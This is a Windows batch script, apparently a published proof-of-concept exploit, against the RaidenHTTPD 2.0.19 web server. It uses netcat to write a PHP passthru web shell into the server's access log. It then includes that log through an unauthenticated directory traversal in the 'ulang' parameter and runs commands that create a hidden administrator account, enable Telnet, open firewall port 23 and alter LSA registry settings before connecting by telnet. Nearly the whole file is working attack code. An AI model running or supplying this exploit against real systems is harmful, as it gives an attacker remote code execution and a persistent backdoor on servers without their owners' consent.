rem raidenhttpdudo.cmd

                  @echo off

                  color 0a

rem RaidenHTTPD 2.0.19 ulang cmd exec poc exploit
rem WebAdmin one - not enabled by default anymore
rem however works regardless of  php.ini, because
rem "ulang" comes from $_GET[] and some magic_quo
rem tes_gpc disable code,lame  divertissement one
rem to demonstrate an  unauthenticated  directory
rem traversal  ...
rem rgod ----------http://violentcop.splinder.com

         if {%1}=={} goto kill

echo HEAD /?^<?ob_end_clean();ob_clean();passthru($_GET[CMD]);die;?^> HTTP/1.1>in
echo Host: %1>>in & echo Connection: Close>>in & echo.>>in
nc %1 80 -v -w1< in > nul
echo ..\..\..\logs\access_%date:~6,4%-%date:~3,2%-%date:~0,2%.log%%00> puf & set /p exploit=< puf
echo GET 
/raidenhttpd-admin/workspace.php?CMD=cmd.exe+%%2Fc+net+user+sun+tzu+%%2Fadd+%%26+net+localgroup+Administrators+sun+%%2Fadd+%%26+sc+config+NtLmSsp+start%%3D+auto+%%26+sc+config+RpcSs+start%%3D+auto+%%26+net+start+RpcSs+%%26+net+start+NtLmSsp+%%26+sc+config+TlntSvr+start%%3D+auto+%%26+net+start+TlntSvr+%%26+netsh+firewall+add+portopening+tcp+23+sh+%%26+echo+REGEDIT4+%%3E+sh.reg+%%26+echo+%%5BHKEY_LOCAL_MACHINE%%5CSYSTEM%%5CCurrentControlSet%%5CControl%%5CLsa%%5D+%%3E%%3E+sh.reg+%%26+echo+%%22forceguest%%22%%3Ddword%%3A00000000+%%3E%%3E+sh.reg+%%26+regedit+%%2FS+sh.reg^&ulang=%exploit% 
HTTP/1.1> in
echo Host: %1>>in & echo Connection: Close>>in & echo.>>in
echo please wait ...
nc %1 80 -v -w1< in > nul
ping localhost -n 15>nul & rem delaying ...
del puf
del in
                telnet %1 23

                goto nowhere

                  :kill
            echo %0 [target-host]

                 :nowhere
